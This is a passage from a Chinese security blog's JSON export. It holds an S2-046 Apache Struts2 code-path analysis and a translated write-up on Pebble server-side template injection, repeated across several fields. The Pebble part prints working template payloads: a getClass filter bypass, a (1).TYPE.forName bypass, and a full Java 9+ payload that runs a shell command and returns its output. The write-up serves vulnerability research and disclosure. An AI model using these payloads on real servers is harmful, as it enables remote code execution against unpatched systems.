data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMzzuj.png\" alt=\"lMzzuj.png\"></p>\n<p>在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lQSi5V.png\" alt=\"lQSi5V.png\"></p>\n<p>见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例</p>\n<p>继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lQSA8U.png\" alt=\"lQSA8U.png\"></p>\n<p>可见request请求被传入上图84行中parse方法中</p>\n<p>继续跟入parse方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lQSkCT.png\" alt=\"lQSkCT.png\"></p>\n<p>上图红框处，可见程序使用processUpload方法处理上传请求</p>\n<p>跟入processUpload方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lQSE2F.png\" alt=\"lQSE2F.png\"></p>\n<p>从上图可见，processUpload方法调用processFileField方法对item进行处理，而item是上传的文件信息</p>\n<p>跟入processFileField</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lQSeKJ.png\" alt=\"lQSeKJ.png\"></p>\n<p>processFileField将会处理上传的文件信息</p>\n<p>继续跟入getName方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lQSCEq.png\" alt=\"lQSCEq.png\"></p>\n<p>getName方法调用Streams.checkFileName处理文件名，而文件名正是我们构造的payload</p>\n<p>跟入checkFileName</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMzjgg.png\" alt=\"lMzjgg.png\"></p>\n<p>checkFileName会验证fileName参数中是否存在”\\u0000”,很显然，我们的payload中构造了这个字段，程序会因此抛出异常</p>\n<p>之后的异常处理以及代码执行步骤，与S2-052完全一致，这里不详细说明了</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Apache Struts2存在远程代码执行漏洞，使用恶意的Content-Disposition值或者使用不合适的Content-Length头将payload传递给存在漏洞的服务器，将导致任意代码执行漏洞</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本次漏洞与S2-045(CVE-2017-5638)极其的相似，S2-046与S2-045都是在请求中构造错误的数据，触发struts2的异常处理机制(buildErrorMessage),而buildErrorMessage又会将报错信息中的ognl表达式进行执行，从而产生了漏洞</p>\n<p>但不同的是S2-045是通过错误的Content-Type字段，而S2-046利用的则是错误的上传文件信息</p>\n<p>因此这里着重讲一下S2-046与S2-045的不同之处。关于最终执行代码的执行点，二者是完全一样的，因此可以参考我之前的分析文章，在这里就不详细说明了</p>\n<p>S2-046漏洞的poc如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lQSSDs.png\" alt=\"lQSSDs.png\"></p>\n<p>从poc中可见，构造了一个含有payload的上传文件名，并且文件名中含有”\\x00”</p>\n<p>我们首先在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMzvvQ.png\" alt=\"lMzvvQ.png\"></p>\n<p>上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支</p>\n<p>跟入prepare.wrapRequest</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMzzuj.png\" alt=\"lMzzuj.png\"></p>\n<p>在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lQSi5V.png\" alt=\"lQSi5V.png\"></p>\n<p>见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例</p>\n<p>继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lQSA8U.png\" alt=\"lQSA8U.png\"></p>\n<p>可见request请求被传入上图84行中parse方法中</p>\n<p>继续跟入parse方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lQSkCT.png\" alt=\"lQSkCT.png\"></p>\n<p>上图红框处，可见程序使用processUpload方法处理上传请求</p>\n<p>跟入processUpload方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lQSE2F.png\" alt=\"lQSE2F.png\"></p>\n<p>从上图可见，processUpload方法调用processFileField方法对item进行处理，而item是上传的文件信息</p>\n<p>跟入processFileField</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lQSeKJ.png\" alt=\"lQSeKJ.png\"></p>\n<p>processFileField将会处理上传的文件信息</p>\n<p>继续跟入getName方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lQSCEq.png\" alt=\"lQSCEq.png\"></p>\n<p>getName方法调用Streams.checkFileName处理文件名，而文件名正是我们构造的payload</p>\n<p>跟入checkFileName</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMzjgg.png\" alt=\"lMzjgg.png\"></p>\n<p>checkFileName会验证fileName参数中是否存在”\\u0000”,很显然，我们的payload中构造了这个字段，程序会因此抛出异常</p>\n<p>之后的异常处理以及代码执行步骤，与S2-052完全一致，这里不详细说明了</p>"},{"title":"【翻译】从Pebble看服务端模板注入漏洞","date":"2019-09-27T05:37:57.000Z","cover":"https://s2.ax1x.com/2019/11/12/M178mD.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nSSTI并不是Web应用程序领域的一种新型漏洞。这些年来，从Flask/Jinja2模版到Twig模版，都存在着SSTI漏洞利用的先例。这篇译文是来自securitum公司首席安全研究员Michał Bentkowski的分析报告，是关于一款名为Pebble的Java 模板引擎的SSTI漏洞的分析与利用。\n\n<!--more-->\n\n下面译文开始\n\n服务器端模板注入并不是Web应用程序领域的一个新漏洞。2015年，James Kettle曾在 PortSwigger blog发表[Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection)一文，使得服务端模板注入漏洞被大家熟知 。本文将由一个不太流行的Java模板引擎-[Pebble](https://pebbletemplates.io/)来引领大家探索服务端模板注入漏洞。\n\n \n\n## Pebble与模板注入\n\n根据官方文档，Pebble是一款Java 模板引擎，开发他的灵感来自于Twig。它具有很强的模板延续性和易于阅读的语法；出于安全性考虑，它内置自动转义功能，并包括对国际化的集成支持。它支持模板引擎中最常见的语法，其中变量替换使用{{variable}}完成。通常，在模板引擎中，可以包含任意的 Java 表达式。假设想将名为 name 的变量放在模板中并大写，这时可以使用 {name.toUpperCase()} 。\n\n在 Java 中各种表达式语言中利用模板注入的常用方法是使用类似于以下内容的代码：\n\n```java\nvariable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls   -la')\n```\n\n基本上，Java中的每个对象都有一个称为 getClass()的方法，它可以通过检索特殊的 java.lang.class，轻而易举的获取任意 Java类的实例。因为它允许执行 OS 命令，下一步通常是获取 java.lang.Runtime 的实例。\n\n```java\n{{   variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la')   }}\n```\n\n\n\n## 尝试阻止在Pebble中获取任意类\n\nPebble 的作者针对攻击的添加了保护程序，并禁用了 getClass()方法调用。但是，有一种有趣的方法可以绕过保护，因为 Pebble 试图在表达式中精简查找method。假设有以下表达式：\n\n```java\n{{ someString.toUPPERCASE()   }}\n```\n\n因为正确的表达式是 toupperCase()而不toUPPERCASE()，所以此表达式并不运行。但是，因为Pebble 在设计时忽略了方法或属性名称中大小写问题，所以实际上使用上面的代码，也可以\"正常\"调用toUpperCase()。\n\n所以，问题是当 Pebble 试图阻止访问getClass()时，它检查方法的名称时区分大小写。因此，可以只使用以下语句：\n\n```java\n{{ someString.getCLASS().forName(...)   }}\n```\n\n来绕过保护，拼写不敏感问题已经 2019 年 4 月 发布的3.0.9 版本中修复了。\n\n几个月后，在研究其他一些与Java相关的内容并浏览文档时，我注意到有另一种内置方法可以访问java.lang.Class。Java 中的几个包装类（例如 java.lang.Integer）中有名为 TYPE 的字段，其Type为 java.lang.Class 自身；因此，执行任意代码的另一种方法如下所示：\n\n```java\n{{   (1).TYPE.forName(...) }}\n```\n\n我[于2019年7月向Pebble](https://github.com/PebbleTemplates/pebble/issues/454)报告[了该问题](https://github.com/PebbleTemplates/pebble/issues/454)，并使用与FreeMarker中相同的方法在master中修复了[该问题](https://github.com/PebbleTemplates/pebble/issues/454)相同的方法（即：在主控中修复了该问题方法调用黑名单）。因此，尽管我仍然可以执行{{ (1).TYPE }}，但是forName()方法被禁用，使得执行任意代码变得“不可能”。我将“不可能”一词用引号引起来，因为我认为仍然可以找到旁路绕过，但是我无法做到这一点。不过这将是可以进行研究的有趣空间。\n\n \n\n## 读取命令的输出（Java 9+）\n\n尽管在Java中很容易执行任意命令，但是在出现诸如服务器端模板注入之类漏洞的情况下，有时候会难以读取输出。它通常是通过遍历生成的 InputStream 或out-of-band传输层协议使用带外数据(传输层协议使用带外数据 译者注)来发送输出来完成的。\n\n在研究Pebble时，我注意到在Java 9+中事情变得简单得多，因为现在`InputStream`有了便捷方法[readAllBytes](https://docs.oracle.com/javase/9/docs/api/java/io/InputStream.html#readAllBytes--)`来读取`返回字节数组，然后`byte[]`可以使用`String`构造函数转换为`String`。以下是漏洞利用代码：\n\n \n\n```java\n{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n     .forName('java.lang.Runtime')\n     .methods[6]\n     .invoke(null,null)\n     .exec(cmd)\n     .inputStream\n     .readAllBytes() %}\n{{ (1).TYPE\n     .forName('java.lang.String')\n     .constructors[0]\n     .newInstance(([bytes]).toArray()) }}\n```\n\n \n\n结果：\n\n![uKCtl6.png](https://s2.ax1x.com/2019/09/27/uKCtl6.png)\n\nPebble示例漏洞利用\n\n## 玩转Pebble\n\n如果您想玩转Pebble，我们准备了一个带有Docker容器的GitHub存储库，您可以在其中运行各种版本的Pebble。您可以在这里获取它：[https](https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble) : [//github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble](https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble)。\n\n确保已经安装了`docker`和`docker-compose`，然后运行`docker-compose`，Web服务器就会在http：// localhost：4567上运行了。\n\n![uKCN6K.png](https://s2.ax1x.com/2019/09/27/uKCN6K.png)\n\nDocker应用程序的屏幕截图\n\n## 总结\n\n与许多的主流模板引擎相比，Pebble并没有本质上的不同；如果允许修改模板，则可以执行任意命令，因此建议确保未经授权的用户永远不能修改模板。","source":"_posts/server-side-template-injection-on-the-example-of-pebble.md","raw":"---\ntitle: 【翻译】从Pebble看服务端模板注入漏洞\ndate: 2019-09-27 13:37:57\ntags: 翻译\ncategories: 技术\ncover: https://s2.ax1x.com/2019/11/12/M178mD.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nSSTI并不是Web应用程序领域的一种新型漏洞。这些年来，从Flask/Jinja2模版到Twig模版，都存在着SSTI漏洞利用的先例。这篇译文是来自securitum公司首席安全研究员Michał Bentkowski的分析报告，是关于一款名为Pebble的Java 模板引擎的SSTI漏洞的分析与利用。\n\n<!--more-->\n\n下面译文开始\n\n服务器端模板注入并不是Web应用程序领域的一个新漏洞。2015年，James Kettle曾在 PortSwigger blog发表[Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection)一文，使得服务端模板注入漏洞被大家熟知 。本文将由一个不太流行的Java模板引擎-[Pebble](https://pebbletemplates.io/)来引领大家探索服务端模板注入漏洞。\n\n \n\n## Pebble与模板注入\n\n根据官方文档，Pebble是一款Java 模板引擎，开发他的灵感来自于Twig。它具有很强的模板延续性和易于阅读的语法；出于安全性考虑，它内置自动转义功能，并包括对国际化的集成支持。它支持模板引擎中最常见的语法，其中变量替换使用{{variable}}完成。通常，在模板引擎中，可以包含任意的 Java 表达式。假设想将名为 name 的变量放在模板中并大写，这时可以使用 {name.toUpperCase()} 。\n\n在 Java 中各种表达式语言中利用模板注入的常用方法是使用类似于以下内容的代码：\n\n```java\nvariable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls   -la')\n```\n\n基本上，Java中的每个对象都有一个称为 getClass()的方法，它可以通过检索特殊的 java.lang.class，轻而易举的获取任意 Java类的实例。因为它允许执行 OS 命令，下一步通常是获取 java.lang.Runtime 的实例。\n\n```java\n{{   variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la')   }}\n```\n\n\n\n## 尝试阻止在Pebble中获取任意类\n\nPebble 的作者针对攻击的添加了保护程序，并禁用了 getClass()方法调用。但是，有一种有趣的方法可以绕过保护，因为 Pebble 试图在表达式中精简查找method。假设有以下表达式：\n\n```java\n{{ someString.toUPPERCASE()   }}\n```\n\n因为正确的表达式是 toupperCase()而不toUPPERCASE()，所以此表达式并不运行。但是，因为Pebble 在设计时忽略了方法或属性名称中大小写问题，所以实际上使用上面的代码，也可以\"正常\"调用toUpperCase()。\n\n所以，问题是当 Pebble 试图阻止访问getClass()时，它检查方法的名称时区分大小写。因此，可以只使用以下语句：\n\n```java\n{{ someString.getCLASS().forName(...)   }}\n```\n\n来绕过保护，拼写不敏感问题已经 2019 年 4 月 发布的3.0.9 版本中修复了。\n\n几个月后，在研究其他一些与Java相关的内容并浏览文档时，我注意到有另一种内置方法可以访问java.lang.Class。Java 中的几个包装类（例如 java.lang.Integer）中有名为 TYPE 的字段，其Type为 java.lang.Class 自身；因此，执行任意代码的另一种方法如下所示：\n\n```java\n{{   (1).TYPE.forName(...) }}\n```\n\n我[于2019年7月向Pebble](https://github.com/PebbleTemplates/pebble/issues/454)报告[了该问题](https://github.com/PebbleTemplates/pebble/issues/454)，并使用与FreeMarker中相同的方法在master中修复了[该问题](https://github.com/PebbleTemplates/pebble/issues/454)相同的方法（即：在主控中修复了该问题方法调用黑名单）。因此，尽管我仍然可以执行{{ (1).TYPE }}，但是forName()方法被禁用，使得执行任意代码变得“不可能”。我将“不可能”一词用引号引起来，因为我认为仍然可以找到旁路绕过，但是我无法做到这一点。不过这将是可以进行研究的有趣空间。\n\n \n\n## 读取命令的输出（Java 9+）\n\n尽管在Java中很容易执行任意命令，但是在出现诸如服务器端模板注入之类漏洞的情况下，有时候会难以读取输出。它通常是通过遍历生成的 InputStream 或out-of-band传输层协议使用带外数据(传输层协议使用带外数据 译者注)来发送输出来完成的。\n\n在研究Pebble时，我注意到在Java 9+中事情变得简单得多，因为现在`InputStream`有了便捷方法[readAllBytes](https://docs.oracle.com/javase/9/docs/api/java/io/InputStream.html#readAllBytes--)`来读取`返回字节数组，然后`byte[]`可以使用`String`构造函数转换为`String`。以下是漏洞利用代码：\n\n \n\n```java\n{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n     .forName('java.lang.Runtime')\n     .methods[6]\n     .invoke(null,null)\n     .exec(cmd)\n     .inputStream\n     .readAllBytes() %}\n{{ (1).TYPE\n     .forName('java.lang.String')\n     .constructors[0]\n     .newInstance(([bytes]).toArray()) }}\n```\n\n \n\n结果：\n\n![uKCtl6.png](https://s2.ax1x.com/2019/09/27/uKCtl6.png)\n\nPebble示例漏洞利用\n\n## 玩转Pebble\n\n如果您想玩转Pebble，我们准备了一个带有Docker容器的GitHub存储库，您可以在其中运行各种版本的Pebble。您可以在这里获取它：[https](https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble) : [//github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble](https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble)。\n\n确保已经安装了`docker`和`docker-compose`，然后运行`docker-compose`，Web服务器就会在http：// localhost：4567上运行了。\n\n![uKCN6K.png](https://s2.ax1x.com/2019/09/27/uKCN6K.png)\n\nDocker应用程序的屏幕截图\n\n## 总结\n\n与许多的主流模板引擎相比，Pebble并没有本质上的不同；如果允许修改模板，则可以执行任意命令，因此建议确保未经授权的用户永远不能修改模板。","slug":"server-side-template-injection-on-the-example-of-pebble","published":1,"updated":"2020-10-27T09:25:29.685Z","_id":"ckgrozu9w004hwsa9fuqe562g","comments":1,"layout":"post","photos":[],"link":"","content":"<p>SSTI并不是Web应用程序领域的一种新型漏洞。这些年来，从Flask/Jinja2模版到Twig模版，都存在着SSTI漏洞利用的先例。这篇译文是来自securitum公司首席安全研究员Michał Bentkowski的分析报告，是关于一款名为Pebble的Java 模板引擎的SSTI漏洞的分析与利用。</p>\n<a id=\"more\"></a>\n\n<p>下面译文开始</p>\n<p>服务器端模板注入并不是Web应用程序领域的一个新漏洞。2015年，James Kettle曾在 PortSwigger blog发表<a href=\"https://portswigger.net/blog/server-side-template-injection\">Server-Side Template Injection</a>一文，使得服务端模板注入漏洞被大家熟知 。本文将由一个不太流行的Java模板引擎-<a href=\"https://pebbletemplates.io/\">Pebble</a>来引领大家探索服务端模板注入漏洞。</p>\n<h2 id=\"Pebble与模板注入\"><a href=\"#Pebble与模板注入\" class=\"headerlink\" title=\"Pebble与模板注入\"></a>Pebble与模板注入</h2><p>根据官方文档，Pebble是一款Java 模板引擎，开发他的灵感来自于Twig。它具有很强的模板延续性和易于阅读的语法；出于安全性考虑，它内置自动转义功能，并包括对国际化的集成支持。它支持模板引擎中最常见的语法，其中变量替换使用完成。通常，在模板引擎中，可以包含任意的 Java 表达式。假设想将名为 name 的变量放在模板中并大写，这时可以使用 {name.toUpperCase()} 。</p>\n<p>在 Java 中各种表达式语言中利用模板注入的常用方法是使用类似于以下内容的代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">variable.getClass().forName(<span class=\"string\">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class=\"string\">&#x27;ls   -la&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>基本上，Java中的每个对象都有一个称为 getClass()的方法，它可以通过检索特殊的 java.lang.class，轻而易举的获取任意 Java类的实例。因为它允许执行 OS 命令，下一步通常是获取 java.lang.Runtime 的实例。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;   variable.getClass().forName(<span class=\"string\">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class=\"string\">&#x27;ls -la&#x27;</span>)   &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"尝试阻止在Pebble中获取任意类\"><a href=\"#尝试阻止在Pebble中获取任意类\" class=\"headerlink\" title=\"尝试阻止在Pebble中获取任意类\"></a>尝试阻止在Pebble中获取任意类</h2><p>Pebble 的作者针对攻击的添加了保护程序，并禁用了 getClass()方法调用。但是，有一种有趣的方法可以绕过保护，因为 Pebble 试图在表达式中精简查找method。假设有以下表达式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123; someString.toUPPERCASE()   &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为正确的表达式是 toupperCase()而不toUPPERCASE()，所以此表达式并不运行。但是，因为Pebble 在设计时忽略了方法或属性名称中大小写问题，所以实际上使用上面的代码，也可以”正常”调用toUpperCase()。</p>\n<p>所以，问题是当 Pebble 试图阻止访问getClass()时，它检查方法的名称时区分大小写。因此，可以只使用以下语句：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123; someString.getCLASS().forName(...)   &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>来绕过保护，拼写不敏感问题已经 2019 年 4 月 发布的3.0.9 版本中修复了。</p>\n<p>几个月后，在研究其他一些与Java相关的内容并浏览文档时，我注意到有另一种内置方法可以访问java.lang.Class。Java 中的几个包装类（例如 java.lang.Integer）中有名为 TYPE 的字段，其Type为 java.lang.Class 自身；因此，执行任意代码的另一种方法如下所示：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;   (<span class=\"number\">1</span>).TYPE.forName(...) &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我<a href=\"https://github.com/PebbleTemplates/pebble/issues/454\">于2019年7月向Pebble</a>报告<a href=\"https://github.com/PebbleTemplates/pebble/issues/454\">了该问题</a>，并使用与FreeMarker中相同的方法在master中修复了<a href=\"https://github.com/PebbleTemplates/pebble/issues/454\">该问题</a>相同的方法（即：在主控中修复了该问题方法调用黑名单）。因此，尽管我仍然可以执行，但是forName()方法被禁用，使得执行任意代码变得“不可能”。我将“不可能”一词用引号引起来，因为我认为仍然可以找到旁路绕过，但是我无法做到这一点。不过这将是可以进行研究的有趣空间。</p>\n<h2 id=\"读取命令的输出（Java-9-）\"><a href=\"#读取命令的输出（Java-9-）\" class=\"headerlink\" title=\"读取命令的输出（Java 9+）\"></a>读取命令的输出（Java 9+）</h2><p>尽管在Java中很容易执行任意命令，但是在出现诸如服务器端模板注入之类漏洞的情况下，有时候会难以读取输出。它通常是通过遍历生成的 InputStream 或out-of-band传输层协议使用带外数据(传输层协议使用带外数据 译者注)来发送输出来完成的。</p>\n<p>在研究Pebble时，我注意到在Java 9+中事情变得简单得多，因为现在<code>InputStream</code>有了便捷方法<a href=\"https://docs.oracle.com/javase/9/docs/api/java/io/InputStream.html#readAllBytes--\">readAllBytes</a><code>来读取</code>返回字节数组，然后<code>byte[]</code>可以使用<code>String</code>构造函数转换为<code>String</code>。以下是漏洞利用代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set cmd = <span class=\"string\">&#x27;id&#x27;</span> %&#125;</span><br><span class=\"line\">&#123;% set bytes = (<span class=\"number\">1</span>).TYPE</span><br><span class=\"line\">     .forName(<span class=\"string\">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class=\"line\">     .methods[<span class=\"number\">6</span>]</span><br><span class=\"line\">     .invoke(<span class=\"keyword\">null</span>,<span class=\"keyword\">null</span>)</span><br><span class=\"line\">     .exec(cmd)</span><br><span class=\"line\">     .inputStream</span><br><span class=\"line\">     .readAllBytes() %&#125;</span><br><span class=\"line\">&#123;&#123; (<span class=\"number\">1</span>).TYPE</span><br><span class=\"line\">     .forName(<span class=\"string\">&#x27;java.lang.String&#x27;</span>)</span><br><span class=\"line\">     .constructors[<span class=\"number\">0</span>]</span><br><span class=\"line\">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>结果：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/27/uKCtl6.png\" alt=\"uKCtl6.png\"></p>\n<p>Pebble示例漏洞利用</p>\n<h2 id=\"玩转Pebble\"><a href=\"#玩转Pebble\" class=\"headerlink\" title=\"玩转Pebble\"></a>玩转Pebble</h2><p>如果您想玩转Pebble，我们准备了一个带有Docker容器的GitHub存储库，您可以在其中运行各种版本的Pebble。您可以在这里获取它：<a href=\"https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble\">https</a> : <a href=\"https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble\">//github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble</a>。</p>\n<p>确保已经安装了<code>docker</code>和<code>docker-compose</code>，然后运行<code>docker-compose</code>，Web服务器就会在http：// localhost：4567上运行了。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/27/uKCN6K.png\" alt=\"uKCN6K.png\"></p>\n<p>Docker应用程序的屏幕截图</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>与许多的主流模板引擎相比，Pebble并没有本质上的不同；如果允许修改模板，则可以执行任意命令，因此建议确保未经授权的用户永远不能修改模板。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>SSTI并不是Web应用程序领域的一种新型漏洞。这些年来，从Flask/Jinja2模版到Twig模版，都存在着SSTI漏洞利用的先例。这篇译文是来自securitum公司首席安全研究员Michał Bentkowski的分析报告，是关于一款名为Pebble的Java 模板引擎的SSTI漏洞的分析与利用。</p>","more":"<p>下面译文开始</p>\n<p>服务器端模板注入并不是Web应用程序领域的一个新漏洞。2015年，James Kettle曾在 PortSwigger blog发表<a href=\"https://portswigger.net/blog/server-side-template-injection\">Server-Side Template Injection</a>一文，使得服务端模板注入漏洞被大家熟知 。本文将由一个不太流行的Java模板引擎-<a href=\"https://pebbletemplates.io/\">Pebble</a>来引领大家探索服务端模板注入漏洞。</p>\n<h2 id=\"Pebble与模板注入\"><a href=\"#Pebble与模板注入\" class=\"headerlink\" title=\"Pebble与模板注入\"></a>Pebble与模板注入</h2><p>根据官方文档，Pebble是一款Java 模板引擎，开发他的灵感来自于Twig。它具有很强的模板延续性和易于阅读的语法；出于安全性考虑，它内置自动转义功能，并包括对国际化的集成支持。它支持模板引擎中最常见的语法，其中变量替换使用完成。通常，在模板引擎中，可以包含任意的 Java 表达式。假设想将名为 name 的变量放在模板中并大写，这时可以使用 {name.toUpperCase()} 。</p>\n<p>在 Java 中各种表达式语言中利用模板注入的常用方法是使用类似于以下内容的代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">variable.getClass().forName(<span class=\"string\">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class=\"string\">&#x27;ls   -la&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>基本上，Java中的每个对象都有一个称为 getClass()的方法，它可以通过检索特殊的 java.lang.class，轻而易举的获取任意 Java类的实例。因为它允许执行 OS 命令，下一步通常是获取 java.lang.Runtime 的实例。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;   variable.getClass().forName(<span class=\"string\">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class=\"string\">&#x27;ls -la&#x27;</span>)   &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"尝试阻止在Pebble中获取任意类\"><a href=\"#尝试阻止在Pebble中获取任意类\" class=\"headerlink\" title=\"尝试阻止在Pebble中获取任意类\"></a>尝试阻止在Pebble中获取任意类</h2><p>Pebble 的作者针对攻击的添加了保护程序，并禁用了 getClass()方法调用。但是，有一种有趣的方法可以绕过保护，因为 Pebble 试图在表达式中精简查找method。假设有以下表达式：</p>\n<figure class=\"highlight java\"><table><tr><td 